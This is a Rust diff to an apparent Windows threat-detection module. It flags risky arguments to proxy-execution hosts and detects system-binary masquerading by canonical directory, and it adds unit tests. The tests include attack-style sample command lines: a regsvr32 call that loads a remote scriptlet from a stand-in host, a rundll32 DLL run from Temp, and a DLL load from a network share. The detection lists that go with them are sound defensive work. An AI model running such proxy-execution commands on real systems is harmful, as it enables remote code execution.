@@ -158,6 +158,116 @@ pub fn invoked_exe(cmd: &str) -> Option<String> {
     (!name.is_empty()).then_some(name)
 }
 
+/// The argument text after the invoked binary (empty when there is none).
+pub fn invocation_args(cmd: &str) -> &str {
+    split_invocation(cmd).1.trim()
+}
+
+/// File extensions of code a proxy-execution host loads or runs: DLLs, control-panel
+/// items, scriptlets, installers and script files.
+pub const PAYLOAD_EXTS: &[&str] = &[
+    ".dll", ".ocx", ".cpl", ".sct", ".msi", ".hta", ".js", ".jse", ".vbs", ".vbe", ".wsf", ".ps1",
+    ".bat", ".cmd",
+];
+
+/// Environment-variable spellings of drop zones, mapped to a representative path so
+/// [`is_user_writable_path`] recognises `%APPDATA%\x.dll` as well as the expanded form.
+const DROPZONE_VARS: &[(&str, &str)] = &[
+    ("%appdata%", r"c:\users\_\appdata\roaming"),
+    ("%localappdata%", r"c:\users\_\appdata\local"),
+    ("%temp%", r"c:\users\_\appdata\local\temp"),
+    ("%tmp%", r"c:\users\_\appdata\local\temp"),
+    ("%public%", r"c:\users\public"),
+    ("%programdata%", r"c:\programdata"),
+    ("%allusersprofile%", r"c:\programdata"),
+];
+
+/// What makes one argument of a proxy-execution host risky.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum ArgRisk {
+    /// A URL (`http://`, `https://`, `ftp://`): code fetched from the network.
+    Url(String),
+    /// A UNC path (`\\host\share\x.dll`): code loaded from another machine / WebDAV.
+    RemoteShare(String),
+    /// A DLL/script file (see [`PAYLOAD_EXTS`]) in a user-writable drop zone.
+    UserWritable(String),
+}
+
+impl std::fmt::Display for ArgRisk {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            ArgRisk::Url(a) => write!(f, "URL {a}"),
+            ArgRisk::RemoteShare(a) => write!(f, "remote share path {a}"),
+            ArgRisk::UserWritable(a) => write!(f, "{a} in a user-writable folder"),
+        }
+    }
+}
+
+/// Split argument text into tokens: quoted runs keep their spaces, unquoted text splits
+/// on whitespace; each token is then split on `,` (rundll32 `x.dll,Entry`) and a
+/// leading `/opt:` prefix (regsvr32 `/i:http://...`) is dropped.
+fn arg_tokens(args: &str) -> Vec<String> {
+    let mut raw: Vec<&str> = Vec::new();
+    for (i, seg) in args.split('"').enumerate() {
+        if i % 2 == 1 {
+            raw.push(seg);
+        } else {
+            raw.extend(seg.split_whitespace());
+        }
+    }
+    let mut out = Vec::new();
+    for tok in raw {
+        for part in tok.split(',') {
+            let mut t = part
+                .trim()
+                .trim_matches(|c| c == '\'' || c == '(' || c == ')' || c == ';');
+            if t.starts_with('/') || t.starts_with('-') {
+                if let Some((_, rest)) = t.split_once(':') {
+                    if !rest.starts_with("//") {
+                        t = rest; // "/i:http://x" -> "http://x"; "/i:C:\x" -> "C:\x"
+                    }
+                }
+            }
+            if !t.is_empty() {
+                out.push(t.to_string());
+            }
+        }
+    }
+    out
+}
+
+/// The risky arguments of a proxy-execution / interpreter invocation: URLs, UNC paths,
+/// and DLL/script files in a user-writable folder (environment-variable forms
+/// included). In order of appearance, without duplicates.
+pub fn risky_args(args: &str) -> Vec<ArgRisk> {
+    let mut out = Vec::new();
+    for tok in arg_tokens(args) {
+        let lower = tok.to_ascii_lowercase();
+        let risk = if ["http://", "https://", "ftp://"]
+            .iter()
+            .any(|s| lower.contains(s))
+        {
+            Some(ArgRisk::Url(tok))
+        } else if lower.starts_with(r"\\") && !lower.starts_with(r"\\?\") {
+            Some(ArgRisk::RemoteShare(tok))
+        } else if PAYLOAD_EXTS.iter().any(|e| lower.ends_with(e)) {
+            let mut expanded = lower.clone();
+            for (var, path) in DROPZONE_VARS {
+                expanded = expanded.replace(var, path);
+            }
+            is_user_writable_path(&expanded).then_some(ArgRisk::UserWritable(tok))
+        } else {
+            None
+        };
+        if let Some(r) = risk {
+            if !out.contains(&r) {
+                out.push(r);
+            }
+        }
+    }
+    out
+}
+
 /// True if the command line passes any argument after the invoked binary.
 pub fn has_arguments(cmd: &str) -> bool {
     !split_invocation(cmd).1.trim().is_empty()
@@ -328,22 +438,57 @@ pub fn is_system_or_program_files(path: &str) -> bool {
         .is_some_and(|rest| rest.starts_with(r":\program files"))
 }
 
-/// S3: a protected system name at an ABSOLUTE path outside the Windows tree.
-/// Relative/bare paths return false — no location info means no masquerade verdict
+/// Where each [`PROTECTED_SYSTEM_NAMES`] binary legitimately lives, as drive-less
+/// lowercase directories (`\windows\system32`). A system name anywhere else — even
+/// elsewhere under `C:\Windows` (`C:\Windows\Temp\svchost.exe`) — is a masquerade.
+/// The 32-bit twins in SysWOW64 are included for the binaries Windows ships there.
+pub const CANONICAL_SYSTEM_DIRS: &[(&str, &[&str])] = &[
+    ("svchost.exe", &[r"\windows\system32", r"\windows\syswow64"]),
+    ("lsass.exe", &[r"\windows\system32"]),
+    ("csrss.exe", &[r"\windows\system32"]),
+    ("winlogon.exe", &[r"\windows\system32"]),
+    ("services.exe", &[r"\windows\system32"]),
+    ("smss.exe", &[r"\windows\system32"]),
+    ("wininit.exe", &[r"\windows\system32"]),
+    ("explorer.exe", &[r"\windows", r"\windows\syswow64"]),
+    (
+        "rundll32.exe",
+        &[r"\windows\system32", r"\windows\syswow64"],
+    ),
+    ("dllhost.exe", &[r"\windows\system32", r"\windows\syswow64"]),
+    ("taskhostw.exe", &[r"\windows\system32"]),
+];
+
+/// The canonical directories of a protected system binary (lowercased file name), if
+/// it is one.
+pub fn canonical_system_dirs(file_name: &str) -> Option<&'static [&'static str]> {
+    CANONICAL_SYSTEM_DIRS
+        .iter()
+        .find(|(n, _)| *n == file_name)
+        .map(|(_, d)| *d)
+}
+
+/// S3 (T1036.005): a protected system name at an ABSOLUTE path outside its canonical
+/// directory. `C:\Users\a\svchost.exe` and `C:\Windows\Temp\svchost.exe` both count;
+/// `C:\Windows\System32\svchost.exe` does not. Any drive letter is accepted for the
+/// canonical directory (Windows on `D:`). Relative/bare paths and NT-namespace forms
+/// (`\SystemRoot\...`) return false — no drive-letter location means no verdict
 /// (honest abstain; the winlogon default `explorer.exe` is a bare name).
 pub fn is_masquerade(path: &str) -> bool {
-    if !path.get(1..).is_some_and(|r| r.starts_with(":\\")) {
+    let p = path.trim().trim_matches('"');
+    if !p.get(1..).is_some_and(|r| r.starts_with(":\\")) {
         return false; // not absolute — abstain
     }
-    if is_under_windows_tree(path) {
+    let lower = p.to_ascii_lowercase();
+    let Some((dir, base)) = lower.rsplit_once('\\') else {
         return false;
-    }
-    let base = path
-        .rsplit(['\\', '/'])
-        .next()
-        .unwrap_or("")
-        .to_ascii_lowercase();
-    PROTECTED_SYSTEM_NAMES.contains(&base.as_str())
+    };
+    let Some(dirs) = canonical_system_dirs(base) else {
+        return false;
+    };
+    // dir is "x:\windows\system32"; compare without the drive letter.
+    let dir = dir.get(2..).unwrap_or("");
+    !dirs.contains(&dir)
 }
 
 #[cfg(test)]
@@ -409,6 +554,33 @@ mod tests {
             vec!["cmd".to_string(), "powershell".to_string()]
         );
         assert!(launchers_in(r"C:\Program Files\WindowsPowerShell\Modules\x.exe").is_empty());
+    }
+
+    #[test]
+    fn risky_args_finds_urls_shares_and_dropzone_payloads() {
+        assert_eq!(
+            risky_args(r"C:\Users\a\AppData\Local\Temp\x.dll,DllRegisterServer"),
+            vec![ArgRisk::UserWritable(
+                r"C:\Users\a\AppData\Local\Temp\x.dll".into()
+            )]
+        );
+        assert_eq!(
+            risky_args("/s /n /u /i:http://evil.example/x.sct scrobj.dll"),
+            vec![ArgRisk::Url("http://evil.example/x.sct".into())]
+        );
+        assert_eq!(
+            risky_args(r#"/q /i "%APPDATA%\pkg\setup.msi""#),
+            vec![ArgRisk::UserWritable(r"%APPDATA%\pkg\setup.msi".into())]
+        );
+        assert_eq!(
+            risky_args(r"\\10.0.0.9\share\x.dll,Run"),
+            vec![ArgRisk::RemoteShare(r"\\10.0.0.9\share\x.dll".into())]
+        );
+        // stock uses: system DLLs, Program Files scripts, non-payload files
+        assert!(risky_args("shell32.dll,Control_RunDLL desk.cpl").is_empty());
+        assert!(risky_args(r"C:\Windows\System32\printui.dll,PrintUIEntry").is_empty());
+        assert!(risky_args(r#""C:\Program Files\V\a.vbs""#).is_empty());
+        assert!(risky_args(r"/c C:\Users\a\AppData\Local\V\app.exe").is_empty());
     }
 
     #[test]
@@ -483,5 +655,25 @@ mod tests {
         assert!(!is_masquerade(r"C:\Windows\explorer.exe"));
         assert!(!is_masquerade("explorer.exe")); // bare name — abstain
         assert!(!is_masquerade(r"C:\Users\a\AppData\Roaming\notmalware.exe")); // not protected name
+    }
+
+    /// The whole Windows tree is no longer trusted: a system name must sit in its
+    /// canonical directory.
+    #[test]
+    fn masquerade_checks_the_canonical_directory_not_the_windows_tree() {
+        assert!(is_masquerade(r"C:\Windows\Temp\svchost.exe"));
+        assert!(is_masquerade(r"C:\Windows\System32\Tasks\lsass.exe"));
+        assert!(is_masquerade(r"C:\Windows\System32\explorer.exe"));
+        assert!(is_masquerade(r"C:\Windows\SysWOW64\lsass.exe"));
+        assert!(!is_masquerade(r"C:\Windows\SysWOW64\svchost.exe"));
+        assert!(!is_masquerade(r"D:\WINDOWS\system32\services.exe"));
+        assert!(!is_masquerade(r#""C:\Windows\System32\rundll32.exe""#));
+        assert!(!is_masquerade(r"\SystemRoot\System32\smss.exe")); // NT path: abstain
+        for n in PROTECTED_SYSTEM_NAMES {
+            assert!(
+                canonical_system_dirs(n).is_some(),
+                "{n} has no canonical dir"
+            );
+        }
     }
 }
